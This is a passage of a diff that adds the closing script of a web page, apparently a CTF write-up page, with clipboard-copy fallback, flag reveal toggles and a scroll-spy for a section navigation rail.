+        document.body.appendChild(ta); ta.select();
+        try { document.execCommand("copy"); done(); } catch(e){}
+        document.body.removeChild(ta);
+      }
+    });
+  });
+
+  document.querySelectorAll(".flagbox .reveal-btn").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var box = btn.closest(".flagbox");
+      btn.textContent = box.classList.toggle("shown") ? "Hide" : "Reveal";
+    });
+  });
+
+  var rail = document.querySelector(".wu-rail");
+  if (rail && "IntersectionObserver" in window) {
+    var links = Array.prototype.slice.call(rail.querySelectorAll("a"));
+    var secs = links.map(function (a) { return document.querySelector(a.getAttribute("href")); }).filter(Boolean);
+    var spy = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (!e.isIntersecting) return;
+        links.forEach(function (a) { a.classList.toggle("on", a.getAttribute("href") === "#" + e.target.id); });
+      });
+    }, { rootMargin:"-20% 0px -70% 0px" });
+    secs.forEach(function (s) { spy.observe(s); });
+  }
+})();
+</script>
+</body>
+</html>
